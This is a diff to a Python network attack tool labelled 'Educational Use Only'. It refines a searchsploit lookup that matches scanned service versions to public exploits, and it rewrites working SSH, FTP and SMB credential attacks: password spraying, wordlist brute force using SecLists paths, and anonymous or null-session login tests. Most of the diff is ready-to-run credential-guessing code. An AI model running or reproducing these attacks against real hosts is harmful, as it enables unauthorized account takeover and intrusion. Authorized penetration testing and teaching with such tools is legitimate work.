@@ -84,7 +84,7 @@ def print_logo():
 {RESET}
 {YELLOW}         Advanced Network Reconnaissance Tool v2.0 Enhanced{RESET}
 {WHITE}            ─────────────────────────────────────────{RESET}
-{GREEN}            Author: Sawsage | Educational Use Only{RESET}
+{GREEN}            Author: CyberSec Student | Educational Use Only{RESET}
 {WHITE}            ─────────────────────────────────────────{RESET}
 """
     print(logo)
@@ -415,91 +415,221 @@ def categorize_vulnerability(vuln_text):
         return 'MEDIUM', BLUE
     return 'INFO', WHITE
 
+def build_search_terms(service, version):
+    """
+    Build tight, product-specific searchsploit queries.
+    Only searches when a specific versioned product is identified.
+    Skips generic OS infrastructure services that produce noise.
+    """
+    import re
+
+    # Services that are generic OS plumbing — never worth searching
+    SKIP_SERVICES = {
+        'tcpwrapped', 'msrpc', 'netbios-ssn', 'microsoft-ds',
+        'kerberos-sec', 'ldap', 'epmap', 'unknown',
+    }
+
+    # Skip this port entirely if the service label is generic
+    if service.lower() in SKIP_SERVICES:
+        return []
+
+    # Generic version strings that contain no searchable product
+    GENERIC_VERSION_PREFIXES = (
+        'microsoft windows',
+        'windows rpc',
+        'windows netbios',
+        'windows active directory',
+        'windows kerberos',
+        'windows ldap',
+    )
+    version_lower = version.lower().strip()
+    for prefix in GENERIC_VERSION_PREFIXES:
+        if version_lower.startswith(prefix):
+            return []
+
+    # Generic service labels that on their own produce noise
+    GENERIC_LABELS = {
+        'http', 'https', 'ftp', 'ssh', 'smtp', 'dns', 'domain',
+        'ssl', 'tcpwrapped', 'unknown',
+    }
+
+    terms = []
+    version = version.strip()
+
+    # Extract the real product name — stop before a version number or
+    # known filler words like 'httpd', 'ftpd', 'smbd'
+    product_match = re.match(
+        r'^([A-Za-z][A-Za-z0-9\s\-\_\.]*?)(?:\s+\d|\s+httpd|\s+ftpd|\s+smbd|\s+\()',
+        version
+    )
+    product = product_match.group(1).strip() if product_match else None
+
+    # Fallback: leading alpha tokens
+    if not product:
+        words = re.match(r'^([A-Za-z][A-Za-z0-9\s\-]*)', version)
+        if words:
+            candidate = words.group(1).strip()
+            if candidate.lower() not in GENERIC_LABELS and len(candidate) > 3:
+                product = candidate
+
+    # Must have a specific product name to proceed
+    if not product or product.lower() in GENERIC_LABELS:
+        return []
+
+    # Extract version number
+    ver_match = re.search(r'(\d+\.\d+[\.\d]*)', version)
+    ver_num = ver_match.group(1) if ver_match else None
+
+    if ver_num:
+        terms.append(f"{product} {ver_num}")  # e.g. "OpenSSH 8.9"
+    terms.append(product)                      # e.g. "OpenSSH"
+
+    return terms[:2]
+
+
+def run_searchsploit(search_term):
+    """Run searchsploit and return only real exploit lines (no header/separator)."""
+    try:
+        r = subprocess.run(
+            ['searchsploit', '--colour', search_term],
+            capture_output=True, text=True, timeout=10
+        )
+        lines = r.stdout.strip().split('\n')
+        results = []
+        for line in lines:
+            # Skip header row, separator rows, and empty lines
+            if not line.strip():
+                continue
+            if 'Exploit Title' in line and 'Path' in line:
+                continue
+            if set(line.strip()) <= set('- |'):
+                continue
+            if '|' not in line:
+                continue
+            parts = [p.strip() for p in line.split('|')]
+            if len(parts) >= 2 and parts[0] and parts[1] and parts[0] != 'Exploit Title':
+                results.append((parts[0], parts[1]))
+        return results
+    except subprocess.TimeoutExpired:
+        return None  # signals timeout
+    except Exception:
+        return []
+
+
 def deep_vulnerability_analysis(scan_results):
     print(f"\n{BOLD}{MAGENTA}╔══════════════════════════════════════════════════════════════╗{RESET}")
     print(f"{BOLD}{MAGENTA}║           🔍 DEEP VULNERABILITY ANALYSIS                     ║{RESET}")
     print(f"{BOLD}{MAGENTA}╚══════════════════════════════════════════════════════════════╝{RESET}\n")
+
     if not check_tool('searchsploit'):
         print_status("searchsploit not found! Install: sudo apt install exploitdb", 'error')
         input(f"\n{YELLOW}Press Enter to continue...{RESET}")
         return
+
     vulnerabilities_found = []
+
     for result in scan_results:
-        print(f"\n{CYAN}[*] Analyzing {result['ip']}...{RESET}\n")
         open_ports = [p for p in result['ports'] if p['state'] == 'open']
+        if not open_ports:
+            continue
+
+        print(f"\n{BOLD}{CYAN}┌─ Host: {result['ip']}{RESET}")
+        print(f"{CYAN}│{RESET}")
+
+        host_vulns = 0
+
         for port in open_ports:
-            if port['version'] and port['version'] != 'unknown':
-                search_terms = []
-                search_terms.append(f"{port['service']} {port['version']}")
-                import re
-                version_match = re.search(r'(\d+\.[\d\.]+)', port['version'])
-                if version_match:
-                    version_num = version_match.group(1)
-                    search_terms.append(f"{port['service']} {version_num}")
-                product_match = re.match(r'^([A-Za-z\s]+)', port['version'])
-                if product_match:
-                    product = product_match.group(1).strip()
-                    if product and product != port['service']:
-                        search_terms.append(product)
-                for search_term in search_terms[:2]:
-                    print(f"{YELLOW}[~] Searching: {search_term}{RESET}")
-                    try:
-                        result_cmd = subprocess.run(['searchsploit', search_term],
-                                                    capture_output=True, text=True, timeout=10)
-                        if result_cmd.stdout:
-                            lines = result_cmd.stdout.strip().split('\n')
-                            exploit_lines = [l for l in lines if '|' in l and not l.startswith('-')]
-                            if len(exploit_lines) > 0:
-                                print(f"{GREEN}[+] Found {len(exploit_lines)} exploit(s)!{RESET}\n")
-                                for line in exploit_lines[:10]:
-                                    parts = line.split('|')
-                                    if len(parts) >= 2:
-                                        exploit_name = parts[0].strip()
-                                        exploit_path = parts[1].strip()
-                                        severity, color = categorize_vulnerability(exploit_name)
-                                        print(f"  {color}[{severity}]{RESET} {exploit_name}")
-                                        print(f"           Path: {exploit_path}\n")
-                                        vulnerabilities_found.append({
-                                            'host': result['ip'],
-                                            'port': port['port'],
-                                            'service': f"{port['service']} {port['version']}",
-                                            'exploit': exploit_name,
-                                            'severity': severity
-                                        })
-                                break
-                            else:
-                                print(f"{BLUE}[*] No exploits in database{RESET}\n")
-                        else:
-                            print(f"{BLUE}[*] No results{RESET}\n")
-                    except subprocess.TimeoutExpired:
-                        print(f"{RED}[-] Search timeout{RESET}\n")
-                    except Exception as e:
-                        print_status(f"Error: {e}", 'error')
+            version = port['version'].strip() if port['version'] else ''
+
+            # Skip ports with no useful version info
+            if not version or version in ('unknown', ''):
+                print(f"{CYAN}│  {YELLOW}Port {port['port']:<6}{RESET} {port['service']:<16} {WHITE}→ no version info, skipping{RESET}")
+                continue
+
+            search_terms = build_search_terms(port['service'], version)
+
+            if not search_terms:
+                print(f"{CYAN}│  {YELLOW}Port {port['port']:<6}{RESET} {port['service']:<16} {WHITE}→ generic service, skipping{RESET}")
+                continue
+
+            exploits_for_port = []
+            searched = False
+
+            for term in search_terms:
+                print(f"{CYAN}│  {YELLOW}Port {port['port']:<6}{RESET} {port['service']:<16} {WHITE}→ searching: {CYAN}\"{term}\"{RESET}")
+                results = run_searchsploit(term)
+
+                if results is None:
+                    print(f"{CYAN}│           {RED}Search timeout{RESET}")
+                    break
+
+                if results:
+                    exploits_for_port = results
+                    searched = True
+                    break  # found results with specific term, don't broaden
+                else:
+                    searched = True
+
+            if not exploits_for_port:
+                if searched:
+                    print(f"{CYAN}│           {BLUE}No exploits found in database{RESET}")
+                continue
+
+            # Print exploit results for this port
+            print(f"{CYAN}│           {GREEN}[+] {len(exploits_for_port)} exploit(s) found:{RESET}")
+            for exploit_name, exploit_path in exploits_for_port[:8]:
+                severity, color = categorize_vulnerability(exploit_name)
+                # Truncate long names cleanly
+                display_name = exploit_name if len(exploit_name) <= 60 else exploit_name[:57] + '...'
+                print(f"{CYAN}│{RESET}           {color}[{severity:<8}]{RESET} {display_name}")
+                print(f"{CYAN}│{RESET}                      {WHITE}{exploit_path}{RESET}")
+                vulnerabilities_found.append({
+                    'host': result['ip'],
+                    'port': port['port'],
+                    'service': f"{port['service']} {version}",
+                    'exploit': exploit_name,
+                    'path': exploit_path,
+                    'severity': severity
+                })
+                host_vulns += 1
+
+            if len(exploits_for_port) > 8:
+                print(f"{CYAN}│           {YELLOW}... and {len(exploits_for_port) - 8} more (run searchsploit \"{search_terms[0]}\" to see all){RESET}")
+
+        print(f"{CYAN}└{'─'*60}{RESET}")
+
+    # ── Summary ──────────────────────────────────────────────────────────────
     if vulnerabilities_found:
-        print(f"\n{BOLD}{RED}{'='*70}{RESET}")
-        print(f"{BOLD}{RED}           VULNERABILITY SUMMARY{RESET}")
-        print(f"{BOLD}{RED}{'='*70}{RESET}\n")
-        critical = [v for v in vulnerabilities_found if v['severity'] == 'CRITICAL']
-        high = [v for v in vulnerabilities_found if v['severity'] == 'HIGH']
-        medium = [v for v in vulnerabilities_found if v['severity'] == 'MEDIUM']
-        if critical:
-            print(f"{RED}{BOLD}CRITICAL ({len(critical)}):{RESET}")
-            for vuln in critical[:5]:
-                print(f"  • {vuln['host']}:{vuln['port']} - {vuln['service']}")
-                print(f"    {vuln['exploit']}\n")
-        if high:
-            print(f"{YELLOW}{BOLD}HIGH ({len(high)}):{RESET}")
-            for vuln in high[:5]:
-                print(f"  • {vuln['host']}:{vuln['port']} - {vuln['service']}")
-                print(f"    {vuln['exploit']}\n")
-        if medium:
-            print(f"{BLUE}{BOLD}MEDIUM ({len(medium)}):{RESET}")
-            for vuln in medium[:3]:
-                print(f"  • {vuln['host']}:{vuln['port']} - {vuln['service']}\n")
-        print(f"{WHITE}Total vulnerabilities found: {len(vulnerabilities_found)}{RESET}")
+        print(f"\n{BOLD}{RED}{'═'*70}{RESET}")
+        print(f"{BOLD}{RED}                    VULNERABILITY SUMMARY{RESET}")
+        print(f"{BOLD}{RED}{'═'*70}{RESET}\n")
+
+        for sev, label, color in [
+            ('CRITICAL', 'CRITICAL', RED),
+            ('HIGH',     'HIGH',     YELLOW),
+            ('MEDIUM',   'MEDIUM',   BLUE),
+            ('INFO',     'INFO',     WHITE),
+        ]:
+            group = [v for v in vulnerabilities_found if v['severity'] == sev]
+            if not group:
+                continue
+            print(f"{color}{BOLD}{label} ({len(group)}){RESET}")
+            for v in group[:5]:
+                print(f"  {color}►{RESET} {v['host']}:{v['port']}  {WHITE}{v['service']}{RESET}")
+                print(f"    {v['exploit']}")
+                print(f"    {CYAN}{v['path']}{RESET}\n")
+            if len(group) > 5:
+                print(f"  {YELLOW}... and {len(group) - 5} more\n{RESET}")
+
+        crit  = sum(1 for v in vulnerabilities_found if v['severity'] == 'CRITICAL')
+        high  = sum(1 for v in vulnerabilities_found if v['severity'] == 'HIGH')
+        med   = sum(1 for v in vulnerabilities_found if v['severity'] == 'MEDIUM')
+        info  = sum(1 for v in vulnerabilities_found if v['severity'] == 'INFO')
+        print(f"{BOLD}Total:{RESET} {RED}{crit} Critical{RESET}  {YELLOW}{high} High{RESET}  {BLUE}{med} Medium{RESET}  {WHITE}{info} Info{RESET}")
     else:
-        print(f"\n{GREEN}[+] No exploits found in database for scanned services{RESET}")
-        print(f"{YELLOW}[!] This doesn't mean the services are secure - consider manual testing{RESET}")
+        print(f"\n{GREEN}[+] No exploits found for the scanned services{RESET}")
+        print(f"{YELLOW}[!] This doesn't mean services are secure — consider manual testing{RESET}")
+
     input(f"\n{YELLOW}Press Enter to continue...{RESET}")
 
 def attempt_exploitation(scan_results):
@@ -660,187 +790,256 @@ def attempt_exploitation(scan_results):
         print_status(f"Error: {e}", 'error')
     input(f"\n{YELLOW}Press Enter to continue...{RESET}")
 
+# ── Default wordlists (SecLists) ──────────────────────────────────────────────
+DEFAULT_USERLIST  = "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
+DEFAULT_PASSLIST  = "/usr/share/seclists/Passwords/Common-Credentials/best110.txt"
+DEFAULT_PASSLIST2 = "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt"
+
+def resolve_wordlist(prompt_label, default_path):
+    """Show default path, let user press Enter to accept or type custom."""
+    if os.path.exists(default_path):
+        print(f"  {BLUE}Default:{RESET} {default_path}")
+        choice = input(f"  {CYAN}{prompt_label} (Enter = use default): {RESET}").strip()
+        path = choice if choice else default_path
+    else:
+        print(f"  {YELLOW}Default wordlist not found:{RESET} {default_path}")
+        path = input(f"  {CYAN}{prompt_label}: {RESET}").strip()
+
+    if not path:
+        print_status("No path provided!", 'error')
+        return None, None
+    try:
+        with open(path, 'r', errors='ignore') as f:
+            words = [l.strip() for l in f if l.strip()]
+        print_status(f"Loaded {len(words)} entries from {os.path.basename(path)}", 'info')
+        return path, words
+    except FileNotFoundError:
+        print_status(f"File not found: {path}", 'error')
+        return None, None
+
+
+def get_spray_passwords():
+    """
+    Prompt user to enter 1-5 passwords inline for password spray.
+    Returns a list of passwords or None on error.
+    """
+    print(f"\n  {YELLOW}Enter passwords to spray (1–5 max).{RESET}")
+    print(f"  {WHITE}Type each password and press Enter. Leave blank to finish.{RESET}\n")
+    passwords = []
+    for i in range(1, 6):
+        pw = input(f"  {CYAN}Password {i}{' (or Enter to finish)' if i > 1 else ''}: {RESET}").strip()
+        if not pw:
+            break
+        passwords.append(pw)
+    if not passwords:
+        print_status("No passwords entered!", 'error')
+        return None
+    print_status(f"Loaded {len(passwords)} password(s) for spray", 'info')
+    return passwords
+
+
 def attacking_ssh(target_ip):
     try:
         import paramiko
     except ImportError:
         print_status("paramiko not installed! Install: pip3 install paramiko", 'error')
         return
-    client = paramiko.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    def _ssh_try(user, password):
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        try:
+            client.connect(hostname=target_ip, username=user, password=password, timeout=3, banner_timeout=3)
+            client.close()
+            return True
+        except paramiko.AuthenticationException:
+            return False
+        except Exception:
+            return False
+        finally:
+            try:
+                client.close()
+            except:
+                pass
+
     print(f"\n{YELLOW}Attack Mode:{RESET}")
-    print(f"{GREEN}[1]{RESET} Full Brute Force (user_list + pass_list)")
-    print(f"{GREEN}[2]{RESET} User Spray (single_user + pass_list)")
-    print(f"{GREEN}[3]{RESET} Anonymous Login Test")
+    print(f"{GREEN}[1]{RESET} Password Spray  — user list × 1–5 passwords (typed inline)")
+    print(f"{GREEN}[2]{RESET} Brute Force     — user list + password list")
+    print(f"{GREEN}[3]{RESET} User Spray      — single username + password list")
+    print(f"{GREEN}[4]{RESET} Anonymous Login Test")
+
     try:
         attack_type = int(input(f"\n{CYAN}Select attack mode: {RESET}"))
     except ValueError:
         print_status("Invalid input!", 'error')
         return
+
     if attack_type == 1:
-        user_list = input(f"{CYAN}Enter path to username list: {RESET}")
-        pass_list = input(f"{CYAN}Enter path to password list: {RESET}")
-        try:
-            with open(user_list, 'r') as u:
-                users = [line.strip() for line in u if line.strip()]
-            with open(pass_list, 'r') as p:
-                passwords = [line.strip() for line in p if line.strip()]
-        except FileNotFoundError as e:
-            print_status(f"File not found: {e}", 'error')
+        # Password Spray: many users, few passwords (typed inline)
+        print(f"\n{YELLOW}Username list:{RESET}")
+        _, users = resolve_wordlist("Path to username list", DEFAULT_USERLIST)
+        if users is None:
             return
-        print_status(f"Loaded {len(users)} users and {len(passwords)} passwords", 'info')
-        print(f"\n{YELLOW}[~] Starting brute force attack on {target_ip}:22...{RESET}\n")
-        found = False
+        passwords = get_spray_passwords()
+        if passwords is None:
+            return
+
+        print(f"\n{YELLOW}[~] Starting password spray on {target_ip}:22...{RESET}\n")
+        for password in passwords:
+            for user in users:
+                if _ssh_try(user, password):
+                    print(f"{GREEN}[+] SUCCESS! User: {BOLD}{user}{RESET}{GREEN} | Password: {BOLD}{password}{RESET}")
+                    return
+                else:
+                    print(f"{RED}[-]{RESET} Failed: {user}:{password}")
+        print_status("No valid credentials found", 'warning')
+
+    elif attack_type == 2:
+        # Full Brute Force: user list × password list
+        print(f"\n{YELLOW}Username list:{RESET}")
+        _, users = resolve_wordlist("Path to username list", DEFAULT_USERLIST)
+        if users is None:
+            return
+        print(f"\n{YELLOW}Password list:{RESET}")
+        _, passwords = resolve_wordlist("Path to password list", DEFAULT_PASSLIST2)
+        if passwords is None:
+            return
+
+        print(f"\n{YELLOW}[~] Starting brute force on {target_ip}:22...{RESET}\n")
         for user in users:
             for password in passwords:
-                try:
-                    client.connect(hostname=target_ip, username=user, password=password, timeout=3, banner_timeout=3)
+                if _ssh_try(user, password):
                     print(f"{GREEN}[+] SUCCESS! User: {BOLD}{user}{RESET}{GREEN} | Password: {BOLD}{password}{RESET}")
-                    found = True
-                    client.close()
                     return
-                except paramiko.AuthenticationException:
+                else:
                     print(f"{RED}[-]{RESET} Failed: {user}:{password}")
-                except Exception:
-                    print(f"{RED}[-]{RESET} Connection error: {user}:{password}")
-                finally:
-                    try:
-                        client.close()
-                    except:
-                        pass
-                    client = paramiko.SSHClient()
-                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        if not found:
-            print_status("No valid credentials found", 'warning')
-    elif attack_type == 2:
-        user = input(f"{CYAN}Enter username: {RESET}")
-        pass_list = input(f"{CYAN}Enter path to password list: {RESET}")
-        try:
-            with open(pass_list, 'r') as p:
-                passwords = [line.strip() for line in p if line.strip()]
-        except FileNotFoundError:
-            print_status(f"Password file not found: {pass_list}", 'error')
-            return
-        print_status(f"Loaded {len(passwords)} passwords", 'info')
-        print(f"\n{YELLOW}[~] Testing user '{user}' on {target_ip}:22...{RESET}\n")
-        found = False
-        for password in passwords:
-            try:
-                client.connect(hostname=target_ip, username=user, password=password, timeout=3, banner_timeout=3)
-                print(f"{GREEN}[+] SUCCESS! User: {BOLD}{user}{RESET}{GREEN} | Password: {BOLD}{password}{RESET}")
-                found = True
-                client.close()
-                return
-            except paramiko.AuthenticationException:
-                print(f"{RED}[-]{RESET} Failed: {password}")
-            except Exception:
-                print(f"{RED}[-]{RESET} Connection error: {password}")
-            finally:
-                try:
-                    client.close()
-                except:
-                    pass
-                client = paramiko.SSHClient()
-                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        if not found:
-            print_status("No valid credentials found", 'warning')
+        print_status("No valid credentials found", 'warning')
+
     elif attack_type == 3:
+        # User Spray: single user, password list
+        user = input(f"{CYAN}Enter username: {RESET}").strip()
+        if not user:
+            print_status("Username required!", 'error')
+            return
+        print(f"\n{YELLOW}Password list:{RESET}")
+        _, passwords = resolve_wordlist("Path to password list", DEFAULT_PASSLIST2)
+        if passwords is None:
+            return
+
+        print(f"\n{YELLOW}[~] Spraying '{user}' on {target_ip}:22...{RESET}\n")
+        for password in passwords:
+            if _ssh_try(user, password):
+                print(f"{GREEN}[+] SUCCESS! User: {BOLD}{user}{RESET}{GREEN} | Password: {BOLD}{password}{RESET}")
+                return
+            else:
+                print(f"{RED}[-]{RESET} Failed: {password}")
+        print_status("No valid credentials found", 'warning')
+
+    elif attack_type == 4:
         print(f"\n{YELLOW}[~] Testing anonymous login on {target_ip}:22...{RESET}\n")
-        try:
-            client.connect(hostname=target_ip, username="anonymous", password="anonymous", timeout=5)
+        if _ssh_try("anonymous", "anonymous"):
             print(f"{GREEN}[+] Anonymous login SUCCESSFUL!{RESET}")
-            client.close()
-        except:
+        else:
             print(f"{RED}[-] Anonymous login failed{RESET}")
+
 
 def attacking_ftp(target_ip):
     import ftplib
+
+    def _ftp_try(user, password):
+        try:
+            ftp = ftplib.FTP()
+            ftp.connect(target_ip, 21, timeout=5)
+            ftp.login(user, password)
+            ftp.quit()
+            return True
+        except ftplib.error_perm:
+            return False
+        except Exception:
+            return False
+        finally:
+            try:
+                ftp.quit()
+            except:
+                pass
+
     print(f"\n{YELLOW}Attack Mode:{RESET}")
-    print(f"{GREEN}[1]{RESET} Full Brute Force (user_list + pass_list)")
-    print(f"{GREEN}[2]{RESET} User Spray (single_user + pass_list)")
-    print(f"{GREEN}[3]{RESET} Anonymous Login Test")
+    print(f"{GREEN}[1]{RESET} Password Spray  — user list × 1–5 passwords (typed inline)")
+    print(f"{GREEN}[2]{RESET} Brute Force     — user list + password list")
+    print(f"{GREEN}[3]{RESET} User Spray      — single username + password list")
+    print(f"{GREEN}[4]{RESET} Anonymous Login Test")
+
     try:
         attack_type = int(input(f"\n{CYAN}Select attack mode: {RESET}"))
     except ValueError:
         print_status("Invalid input!", 'error')
         return
+
     if attack_type == 1:
-        user_list = input(f"{CYAN}Enter path to username list: {RESET}")
-        pass_list = input(f"{CYAN}Enter path to password list: {RESET}")
-        try:
-            with open(user_list, 'r') as u:
-                users = [line.strip() for line in u if line.strip()]
-            with open(pass_list, 'r') as p:
-                passwords = [line.strip() for line in p if line.strip()]
-        except FileNotFoundError as e:
-            print_status(f"File not found: {e}", 'error')
+        print(f"\n{YELLOW}Username list:{RESET}")
+        _, users = resolve_wordlist("Path to username list", DEFAULT_USERLIST)
+        if users is None:
             return
-        print_status(f"Loaded {len(users)} users and {len(passwords)} passwords", 'info')
-        print(f"\n{YELLOW}[~] Starting brute force attack on {target_ip}:21...{RESET}\n")
-        found = False
+        passwords = get_spray_passwords()
+        if passwords is None:
+            return
+
+        print(f"\n{YELLOW}[~] Starting password spray on {target_ip}:21...{RESET}\n")
+        for password in passwords:
+            for user in users:
+                if _ftp_try(user, password):
+                    print(f"{GREEN}[+] SUCCESS! User: {BOLD}{user}{RESET}{GREEN} | Password: {BOLD}{password}{RESET}")
+                    return
+                else:
+                    print(f"{RED}[-]{RESET} Failed: {user}:{password}")
+        print_status("No valid credentials found", 'warning')
+
+    elif attack_type == 2:
+        print(f"\n{YELLOW}Username list:{RESET}")
+        _, users = resolve_wordlist("Path to username list", DEFAULT_USERLIST)
+        if users is None:
+            return
+        print(f"\n{YELLOW}Password list:{RESET}")
+        _, passwords = resolve_wordlist("Path to password list", DEFAULT_PASSLIST2)
+        if passwords is None:
+            return
+
+        print(f"\n{YELLOW}[~] Starting brute force on {target_ip}:21...{RESET}\n")
         for user in users:
             for password in passwords:
-                try:
-                    ftp = ftplib.FTP()
-                    ftp.connect(target_ip, 21, timeout=5)
-                    ftp.login(user, password)
+                if _ftp_try(user, password):
                     print(f"{GREEN}[+] SUCCESS! User: {BOLD}{user}{RESET}{GREEN} | Password: {BOLD}{password}{RESET}")
-                    found = True
-                    ftp.quit()
                     return
-                except ftplib.error_perm:
+                else:
                     print(f"{RED}[-]{RESET} Failed: {user}:{password}")
-                except Exception:
-                    print(f"{RED}[-]{RESET} Connection error: {user}:{password}")
-                finally:
-                    try:
-                        ftp.quit()
-                    except:
-                        pass
-        if not found:
-            print_status("No valid credentials found", 'warning')
-    elif attack_type == 2:
-        user = input(f"{CYAN}Enter username: {RESET}")
-        pass_list = input(f"{CYAN}Enter path to password list: {RESET}")
-        try:
-            with open(pass_list, 'r') as p:
-                passwords = [line.strip() for line in p if line.strip()]
-        except FileNotFoundError:
-            print_status(f"Password file not found: {pass_list}", 'error')
-            return
-        print_status(f"Loaded {len(passwords)} passwords", 'info')
-        print(f"\n{YELLOW}[~] Testing user '{user}' on {target_ip}:21...{RESET}\n")
-        found = False
-        for password in passwords:
-            try:
-                ftp = ftplib.FTP()
-                ftp.connect(target_ip, 21, timeout=5)
-                ftp.login(user, password)
-                print(f"{GREEN}[+] SUCCESS! User: {BOLD}{user}{RESET}{GREEN} | Password: {BOLD}{password}{RESET}")
-                found = True
-                ftp.quit()
-                return
-            except ftplib.error_perm:
-                print(f"{RED}[-]{RESET} Failed: {password}")
-            except Exception:
-                print(f"{RED}[-]{RESET} Connection error: {password}")
-            finally:
-                try:
-                    ftp.quit()
-                except:
-                    pass
-        if not found:
-            print_status("No valid credentials found", 'warning')
+        print_status("No valid credentials found", 'warning')
+
     elif attack_type == 3:
+        user = input(f"{CYAN}Enter username: {RESET}").strip()
+        if not user:
+            print_status("Username required!", 'error')
+            return
+        print(f"\n{YELLOW}Password list:{RESET}")
+        _, passwords = resolve_wordlist("Path to password list", DEFAULT_PASSLIST2)
+        if passwords is None:
+            return
+
+        print(f"\n{YELLOW}[~] Spraying '{user}' on {target_ip}:21...{RESET}\n")
+        for password in passwords:
+            if _ftp_try(user, password):
+                print(f"{GREEN}[+] SUCCESS! User: {BOLD}{user}{RESET}{GREEN} | Password: {BOLD}{password}{RESET}")
+                return
+            else:
+                print(f"{RED}[-]{RESET} Failed: {password}")
+        print_status("No valid credentials found", 'warning')
+
+    elif attack_type == 4:
         print(f"\n{YELLOW}[~] Testing anonymous login on {target_ip}:21...{RESET}\n")
-        try:
-            ftp = ftplib.FTP()
-            ftp.connect(target_ip, 21, timeout=5)
-            ftp.login('anonymous', 'anonymous@')
+        if _ftp_try('anonymous', 'anonymous@'):
             print(f"{GREEN}[+] Anonymous login SUCCESSFUL!{RESET}")
-            ftp.quit()
-        except:
+        else:
             print(f"{RED}[-] Anonymous login failed{RESET}")
+
 
 def attacking_smb(target_ip):
     try:
@@ -848,84 +1047,96 @@ def attacking_smb(target_ip):
     except ImportError:
         print_status("impacket not installed! Install: pip3 install impacket", 'error')
         return
+
+    def _smb_try(user, password):
+        try:
+            conn = SMBConnection(target_ip, target_ip, timeout=5)
+            conn.login(user, password)
+            conn.logoff()
+            return True
+        except Exception:
+            return False
+        finally:
+            try:
+                conn.logoff()
+            except:
+                pass
+
     print(f"\n{YELLOW}Attack Mode:{RESET}")
-    print(f"{GREEN}[1]{RESET} Full Brute Force (user_list + pass_list)")
-    print(f"{GREEN}[2]{RESET} User Spray (single_user + pass_list)")
-    print(f"{GREEN}[3]{RESET} Null Session Test")
+    print(f"{GREEN}[1]{RESET} Password Spray  — user list × 1–5 passwords (typed inline)")
+    print(f"{GREEN}[2]{RESET} Brute Force     — user list + password list")
+    print(f"{GREEN}[3]{RESET} User Spray      — single username + password list")
+    print(f"{GREEN}[4]{RESET} Null Session Test")
+
     try:
         attack_type = int(input(f"\n{CYAN}Select attack mode: {RESET}"))
     except ValueError:
         print_status("Invalid input!", 'error')
         return
+
     if attack_type == 1:
-        user_list = input(f"{CYAN}Enter path to username list: {RESET}")
-        pass_list = input(f"{CYAN}Enter path to password list: {RESET}")
-        try:
-            with open(user_list, 'r') as u:
-                users = [line.strip() for line in u if line.strip()]
-            with open(pass_list, 'r') as p:
-                passwords = [line.strip() for line in p if line.strip()]
-        except FileNotFoundError as e:
-            print_status(f"File not found: {e}", 'error')
+        print(f"\n{YELLOW}Username list:{RESET}")
+        _, users = resolve_wordlist("Path to username list", DEFAULT_USERLIST)
+        if users is None:
             return
-        print_status(f"Loaded {len(users)} users and {len(passwords)} passwords", 'info')
-        print(f"\n{YELLOW}[~] Starting brute force attack on {target_ip}:445...{RESET}\n")
-        found = False
+        passwords = get_spray_passwords()
+        if passwords is None:
+            return
+
+        print(f"\n{YELLOW}[~] Starting password spray on {target_ip}:445...{RESET}\n")
+        for password in passwords:
+            for user in users:
+                if _smb_try(user, password):
+                    print(f"{GREEN}[+] SUCCESS! User: {BOLD}{user}{RESET}{GREEN} | Password: {BOLD}{password}{RESET}")
+                    return
+                else:
+                    print(f"{RED}[-]{RESET} Failed: {user}:{password}")
+        print_status("No valid credentials found", 'warning')
+
+    elif attack_type == 2:
+        print(f"\n{YELLOW}Username list:{RESET}")
+        _, users = resolve_wordlist("Path to username list", DEFAULT_USERLIST)
+        if users is None:
+            return
+        print(f"\n{YELLOW}Password list:{RESET}")
+        _, passwords = resolve_wordlist("Path to password list", DEFAULT_PASSLIST2)
+        if passwords is None:
+            return
+
+        print(f"\n{YELLOW}[~] Starting brute force on {target_ip}:445...{RESET}\n")
         for user in users:
             for password in passwords:
-                try:
-                    conn = SMBConnection(target_ip, target_ip, timeout=5)
-                    conn.login(user, password)
+                if _smb_try(user, password):
                     print(f"{GREEN}[+] SUCCESS! User: {BOLD}{user}{RESET}{GREEN} | Password: {BOLD}{password}{RESET}")
-                    found = True
-                    conn.logoff()
                     return
-                except Exception:
+                else:
                     print(f"{RED}[-]{RESET} Failed: {user}:{password}")
-                finally:
-                    try:
-                        conn.logoff()
-                    except:
-                        pass
-        if not found:
-            print_status("No valid credentials found", 'warning')
-    elif attack_type == 2:
-        user = input(f"{CYAN}Enter username: {RESET}")
-        pass_list = input(f"{CYAN}Enter path to password list: {RESET}")
-        try:
-            with open(pass_list, 'r') as p:
-                passwords = [line.strip() for line in p if line.strip()]
-        except FileNotFoundError:
-            print_status(f"Password file not found: {pass_list}", 'error')
-            return
-        print_status(f"Loaded {len(passwords)} passwords", 'info')
-        print(f"\n{YELLOW}[~] Testing user '{user}' on {target_ip}:445...{RESET}\n")
-        found = False
-        for password in passwords:
-            try:
-                conn = SMBConnection(target_ip, target_ip, timeout=5)
-                conn.login(user, password)
-                print(f"{GREEN}[+] SUCCESS! User: {BOLD}{user}{RESET}{GREEN} | Password: {BOLD}{password}{RESET}")
-                found = True
-                conn.logoff()
-                return
-            except Exception:
-                print(f"{RED}[-]{RESET} Failed: {password}")
-            finally:
-                try:
-                    conn.logoff()
-                except:
-                    pass
-        if not found:
-            print_status("No valid credentials found", 'warning')
+        print_status("No valid credentials found", 'warning')
+
     elif attack_type == 3:
+        user = input(f"{CYAN}Enter username: {RESET}").strip()
+        if not user:
+            print_status("Username required!", 'error')
+            return
+        print(f"\n{YELLOW}Password list:{RESET}")
+        _, passwords = resolve_wordlist("Path to password list", DEFAULT_PASSLIST2)
+        if passwords is None:
+            return
+
+        print(f"\n{YELLOW}[~] Spraying '{user}' on {target_ip}:445...{RESET}\n")
+        for password in passwords:
+            if _smb_try(user, password):
+                print(f"{GREEN}[+] SUCCESS! User: {BOLD}{user}{RESET}{GREEN} | Password: {BOLD}{password}{RESET}")
+                return
+            else:
+                print(f"{RED}[-]{RESET} Failed: {password}")
+        print_status("No valid credentials found", 'warning')
+
+    elif attack_type == 4:
         print(f"\n{YELLOW}[~] Testing null session on {target_ip}:445...{RESET}\n")
-        try:
-            conn = SMBConnection(target_ip, target_ip, timeout=5)
-            conn.login('', '')
+        if _smb_try('', ''):
             print(f"{GREEN}[+] Null session SUCCESSFUL!{RESET}")
-            conn.logoff()
-        except:
+        else:
             print(f"{RED}[-] Null session failed{RESET}")
